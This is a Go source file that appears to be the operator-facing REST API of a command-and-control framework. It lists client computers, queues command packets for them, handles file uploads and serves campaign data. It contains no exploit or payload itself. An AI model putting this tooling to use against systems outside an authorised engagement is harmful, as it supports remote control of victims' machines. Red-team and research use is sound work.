package server

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type FrontendRest struct {
	campaign   *campaign.Campaign
	middleware *Middleware
}

func MakeFrontendRest(campaign *campaign.Campaign, middleware *Middleware) FrontendRest {
	f := FrontendRest{
		campaign:   campaign,
		middleware: middleware,
	}
	return f
}

func (f *FrontendRest) adminListPackets(rw http.ResponseWriter, r *http.Request) {
	packetInfos := f.middleware.FrontendAllPacket()
	json, err := json.Marshal(packetInfos)
	if err != nil {
		log.Error("FrontendRest: Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (f *FrontendRest) adminListPacketsComputerId(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	computerId := vars["computerId"]

	if computerId == "" {
		return
	}
	packetInfos := f.middleware.FrontendGetPacketById(computerId)
	json, err := json.Marshal(packetInfos)
	if err != nil {
		log.Error("FrontendRest: Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (f *FrontendRest) adminListClients(rw http.ResponseWriter, r *http.Request) {
	hostList := f.middleware.FrontendAllClients()
	json, err := json.Marshal(hostList)
	if err != nil {
		log.Error("FrontendRest: Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (f *FrontendRest) adminUploadFile(rw http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(10 << 20)
	file, header, err := r.FormFile("fileKey")
	if err != nil {
		log.Println("Error Getting File", err)
		return
	}
	defer file.Close()

	f.middleware.AdminUploadFile(header.Filename, file)

	fmt.Fprintf(rw, "ok\n")
}

func (f *FrontendRest) adminAddPacket(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	user := vars["user"]

	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("FrontendRest: Could not read body")
		return
	}
	var packet model.Packet
	err = json.Unmarshal(reqBody, &packet)
	if err != nil {
		log.Errorf("FrontendRest: Could not unmarshall: %s", err.Error())
		return
	}

	common.LogPacket("FrontendRest: Add Packet", packet)

	if packet.ComputerId == "" || packet.PacketId == "" || packet.PacketType == "" {
		log.Errorf("FrontendRest: Missing data in packet: %v", packet)
		return
	}

	err = f.middleware.FrontendAddNewPacket(&packet, user)
	if err != nil {
		log.Errorf("FrontendRest: FrontendAddPacket error: %s", err.Error())
		http.Error(rw, "", http.StatusBadRequest)
		return
	}
}

func (f *FrontendRest) adminGetCampaign(rw http.ResponseWriter, r *http.Request) {
	json, err := json.Marshal(f.campaign)
	if err != nil {
		log.Error("FrontendRest: Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (f *FrontendRest) adminGetUploads(rw http.ResponseWriter, r *http.Request) {
	dirList, err := common.ListDirectory("./upload")
	if err != nil {
		log.Error("FrontendRest: Could not list directory ./upload: ", err)
		return
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		log.Error("FrontendRest: Could not JSON marshal", err)
		return
	}
	fmt.Fprint(rw, string(json))
}

func (f *FrontendRest) adminGetStatics(rw http.ResponseWriter, r *http.Request) {
	dirList, err := common.ListDirectory("./static")
	if err != nil {
		log.Errorf("FrontendRest: Could not list directory: ./static: %s", err)
		return
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		log.Error("FrontendRest: Could not JSON marshal", err)
		return
	}
	fmt.Fprint(rw, string(json))
}
